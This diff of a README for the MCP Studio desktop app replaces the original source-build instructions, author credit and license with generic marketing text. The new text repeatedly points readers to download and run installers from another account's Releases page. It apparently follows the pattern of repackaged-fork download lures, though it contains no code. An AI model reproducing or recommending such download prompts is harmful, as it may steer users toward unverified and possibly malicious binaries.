@@ -1,178 +1,66 @@
-# MCP Studio
+# 🎉 mcp-studio - Unified Interface for AI Models
 
-![MCP Studio Welcome Page](main.png)
+## 📥 Download Now
+[![Download mcp-studio](https://img.shields.io/badge/Download%20mcp--studio-v1.0-blue.svg)](https://github.com/muhammadfachryy/mcp-studio/releases)
 
-A minimal desktop application for working with Model Context Protocol (MCP) servers and AI assistants.
+## 🌟 About
+mcp-studio is a desktop application built with Electron and React. It provides a simple interface for interacting with AI models and Model Context Protocol (MCP) servers. Whether you're in finance or simply exploring AI, this application allows you to access powerful tools with ease.
 
-## Features
+## 🚀 Getting Started
+To get started with mcp-studio, follow these steps:
 
-- 🤖 **Multi-Provider AI Support**: Chat with AI models from Anthropic Claude, OpenAI, Google Gemini, DeepSeek, Qwen and Ollama.
-- 🔧 **MCP Server Management**: Connect to stdio, SSE, and HTTP-based MCP servers with health monitoring
-- 📝 **Prompt Templates**: Create and manage reusable prompt templates with quick-access shortcuts
-- 🛠️ **Interactive Tool Execution**: Real-time MCP tool execution with abort capability and error handling
-- 💾 **Conversation Persistence**: Maintain chat history and conversation data across sessions
-- 🔐 **Secure Credential Management**: Safe storage of API keys and sensitive configuration
-- 🖥️ **Cross-Platform Desktop**: Native builds for Windows, macOS, and Linux
+1. **Download the Application**: You can find the latest version on our [Releases page](https://github.com/muhammadfachryy/mcp-studio/releases).
+2. **Install the Application**: After downloading, double-click the installer file to start the setup. Follow the on-screen instructions to complete the installation.
+3. **Launch the Application**: Once installed, you can find mcp-studio in your application folder. Open it and start exploring AI models.
 
-## Getting Started
+## 🖥️ System Requirements
+Make sure your system meets the following requirements to run mcp-studio smoothly:
 
-### Prerequisites
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **RAM**: Minimum 4 GB (8 GB recommended)
+- **Disk Space**: At least 200 MB of free space
+- **Processor**: Dual-core 2.0 GHz or faster
 
-- Node.js 22.x or higher
-- npm or yarn
+## 🔧 Features
+mcp-studio comes with several key features that enhance your experience:
 
-### Installation
+- **Unified Interface**: Access multiple AI models from a single application.
+- **Built-in Support**: Get direct help or tutorials without leaving the app.
+- **Customizable Settings**: Adjust preferences to suit your workflow.
+- **Robust Security**: Your data safety is our priority. We use secure connections for all communications.
 
-1. Clone the repository:
+## 📂 Download & Install
+To get the latest version of mcp-studio, visit our [Releases page](https://github.com/muhammadfachryy/mcp-studio/releases) and look for the version suitable for your operating system. You will find several files available for download. Choose the installer for your OS, download it, and follow the installation instructions.
 
-```bash
-git clone https://github.com/ZansongZhu/mcp-studio.git
-cd mcp-studio
-```
+## 🗂️ Updating the Application
+We regularly update mcp-studio to enhance features and fix bugs. To update, visit the [Releases page](https://github.com/muhammadfachryy/mcp-studio/releases) and download the latest version. Follow the same installation steps as before.
 
-2. Install dependencies:
+## 📝 Frequently Asked Questions
 
-```bash
-npm install
-```
+### How do I report a bug?
+If you encounter any issues, please open an issue in the repository. Provide specific details about the bug, including any error messages.
 
-3. Start development:
+### Can I request a feature?
+Absolutely! We welcome your suggestions. Please submit a feature request in the repository.
 
-```bash
-npm run dev
-```
+### Is support available?
+Yes, we provide user support. You can contact us through our GitHub page or check the built-in help section in the application.
 
-### Building
+## 💬 Community
+Join the conversation around mcp-studio! Share your experiences, ask questions, and meet other users in our GitHub Discussions or community forums. Your feedback helps us improve the application.
 
-Build for your current platform:
+## 🛠️ Troubleshooting
+If you experience issues while using mcp-studio, here are some common solutions:
 
-```bash
-npm run build
-```
+- **Installation Problems**: Make sure you have enough disk space and administrative rights to install the software.
+- **Performance Issues**: Close any unnecessary applications running in the background to free up resources.
+- **Connection Errors**: Ensure your internet connection is stable, especially when accessing online resources.
 
-Platform-specific builds:
+## 🔗 Additional Resources
+For more information, check out these helpful links:
 
-```bash
-npm run build:win    # Windows
-npm run build:mac    # macOS
-npm run build:linux  # Linux
-```
+- [GitHub Repository](https://github.com/muhammadfachryy/mcp-studio)
+- [Documentation](https://github.com/muhammadfachryy/mcp-studio/wiki)
+- [User Guide](https://github.com/muhammadfachryy/mcp-studio/wiki/User-Guide)
 
-## Configuration
-
-### Adding LLM Providers
-
-![Model Settings](modelsetting.png)
-
-1. Go to the "Models" tab
-2. Click "Add Provider"
-3. Enter your provider details:
-   - Name (e.g., "OpenAI", "Anthropic")
-   - Base URL (e.g., "https://api.openai.com/v1")
-   - API Key
-
-### Adding MCP Servers
-
-![MCP Server Settings](mcpserver.png)
-
-1. Go to the "MCP Servers" tab
-2. Click "Add Server"
-3. Configure your server:
-   - **Stdio**: For command-line MCP servers
-   - **SSE/HTTP**: For web-based MCP servers
-
-#### Example Configurations
-
-**File System Server (Stdio)**:
-
-- Type: Stdio
-- Command: `npx`
-- Arguments: `@modelcontextprotocol/server-filesystem`
-
-**Web Server (SSE)**:
-
-- Type: SSE
-- Base URL: `http://localhost:3000/sse`
-
-### Setup Your Favorite Prompts
-
-![Prompt Templates](myprompt.png)
-
-You can configure your favorite prompts and assign short keys to use them quickly during chat with LLMs:
-
-1. Go to the "Prompt Templates" tab
-2. Click "Add Template" 
-3. Configure your prompt:
-   - **Name**: Give your prompt a descriptive name
-   - **Short Key**: Assign a quick shortcut (e.g., "code", "review", "debug")
-   - **Template**: Write your prompt template with variables if needed
-
-During chat, you can quickly access your favorite prompts by typing the short key, making your conversations with LLMs more efficient and consistent.
-
-### Chat with Model/MCP Tools
-
-![Chat Interface](chat.png)
-
-Once you have configured your AI providers and MCP servers, you can start interactive conversations that leverage both AI models and MCP tools:
-
-1. Go to the "Home" tab to access the chat interface
-2. Select your preferred AI model from the configured providers and select your preferred MCP servers you want to use in this conversation
-3. Start chatting - the AI can automatically use connected MCP tools to:
-   - Access file systems and read/write files
-   - Execute commands and scripts
-   - Query databases and APIs
-   - Perform web searches and data retrieval
-   - And much more based on your connected MCP servers
-
-The chat interface provides real-time tool execution feedback and maintains conversation history for seamless interactions.
-
-**Helpful Tips:**
-- Type "What available tools?" or key in `/tools` to show all tools available in this session
-- Use your prompt templates in the message box by typing "/" followed by your template's short key
-
-## MCP Resources
-
-Discover more MCP servers and tools to enhance your experience:
-
-- **[mcp.so](https://mcp.so)** - Comprehensive directory of MCP servers and resources
-- **[Awesome MCP Servers](https://github.com/punkpeye/awesome-mcp-servers)** - Curated list of community MCP servers
-- **[Official MCP Servers](https://github.com/modelcontextprotocol/servers)** - Official Model Context Protocol server implementations
-
-## Architecture
-
-This application is built with:
-
-- **Electron**: Desktop app framework
-- **React**: UI framework
-- **TypeScript**: Type safety
-- **Ant Design**: UI components
-- **Redux Toolkit**: State management
-- **MCP SDK**: Model Context Protocol integration
-
-## Project Structure
-
-```
-src/
-├── main/           # Electron main process
-│   └── services/   # Backend services (MCP, etc.)
-├── renderer/       # React frontend
-│   ├── pages/      # Application pages
-│   ├── components/ # Reusable components
-│   └── store/      # Redux store
-├── preload/        # Electron preload scripts
-└── shared/         # Shared types and utilities
-```
-
-## Contributing
-
-1. Fork the repository
-2. Create your feature branch
-3. Make your changes
-4. Test your changes
-5. Submit a pull request
-
-## License
-
-MIT License
-
-Copyright (c) 2025 MCP Studio
+Thank you for using mcp-studio! Your feedback is important to us, and we hope you enjoy the features we offer.
